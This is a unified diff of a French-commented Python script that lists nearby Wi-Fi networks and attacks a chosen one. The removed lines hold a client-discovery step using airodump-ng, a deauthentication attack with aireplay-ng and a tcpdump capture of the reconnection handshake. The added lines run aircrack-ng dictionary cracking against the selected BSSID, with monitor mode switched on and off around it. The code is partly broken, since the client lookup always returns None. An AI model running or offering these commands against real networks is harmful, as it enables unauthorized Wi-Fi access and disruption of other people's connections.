@@ -1,13 +1,7 @@
 import subprocess
 import iwlist
-import time
-import os
-import glob
 from config import card
 from config import withoutmonitor
-from monitor import activate_monitor
-#from findmac import extract_station_mac
-
 
 
 def scan_wifi_networks(interface):
@@ -50,57 +44,26 @@ def display_wifi_list_and_wifi_choice(withoutmonitor):
         execute_aircrack(selected_cell, channel_final)
     else:
         print("Index non valide. Veuillez sélectionner un numéro de réseau valide.")
-        
-
-def find_client_mac(bssid, channel, card):
-    try:
-        #Supprime le contenu de airdumpfile
-        for filename in os.listdir('airdumpfile/'):
-            if os.path.isfile(os.path.join('airdumpfile/', filename)):
-                os.remove(os.path.join('airdumpfile/', filename))
-        # Exécute la commande airodump-ng pour afficher les informations sur les clients
-        airodump_command = ['sudo','airodump-ng', '-w', 'airdumpfile/airdump', '--bssid', bssid, '--channel', str(channel), card]
-        result = subprocess.Popen(airodump_command, shell = True)
-        time.sleep(10)
-        subprocess.Popen.kill(result)
-      
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors de la recherche de l'adresse MAC du client : {e.stderr}")
-
-    return None
 
 def execute_aircrack(selected_cell, channel_final, worldlist_path='worldlist.txt', capture_file='cap.cap'):
     # Récupère les informations nécessaires du réseau sélectionné
     bssid = selected_cell['mac']
 
+    # Construit la commande Aircrack-ng
+    aircrack_command = ['aircrack-ng', '-w', worldlist_path, '-b', bssid, capture_file,]
+
     try:
-        activate_monitor(withoutmonitor)
-        time.sleep(2)
-        # Trouve l'adresse MAC d'un client associé
-        client_mac = find_client_mac(bssid, channel_final, card)
-
-        if client_mac:
-            print(f"Adresse MAC du client associé : {client_mac}")
-
-            # Exécute l'attaque de désauthentification avec aireplay-ng
-            deauth_command = ['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', client_mac, 'wlan0mon']
-            subprocess.run(deauth_command, check=True)
-
-            # Capture les paquets de reconnexion avec tcpdump
-            capture_command = ['tcpdump', '-i', 'wlan0mon', '-c', '1', '-w', 'reconnect_capture.pcap']
-            subprocess.run(capture_command, check=True)
-
-            print("Paquet de reconnexion capturé!")
-        else:
-            print("Aucun client associé trouvé.")
+        # Exécute la commande Aircrack-ng en tant que processus externe et activation du mode moniteur
+        result = subprocess.run(["sudo", "python3", "monitor.py", "-a"], check=True)
+        result = subprocess.run(aircrack_command, capture_output=True, text=True, check=True)
+        print("Commande Aircack Dans le Futur")
+        result = subprocess.run(["sudo", "python3", "monitor.py", "-d"], check=True)
+        # Affiche la sortie de la commande
+        #print(result.stdout)
 
     except subprocess.CalledProcessError as e:
         # Gère les erreurs lors de l'exécution de la commande
         print(f"Erreur lors de l'exécution de la commande Aircrack-ng : {e.stderr}")
-
-    finally:
-        # Désactive le mode moniteur
-        subprocess.run(["sudo", "python3", "monitor.py", "-d"], check=True)
 
 
 if __name__ == "__main__":
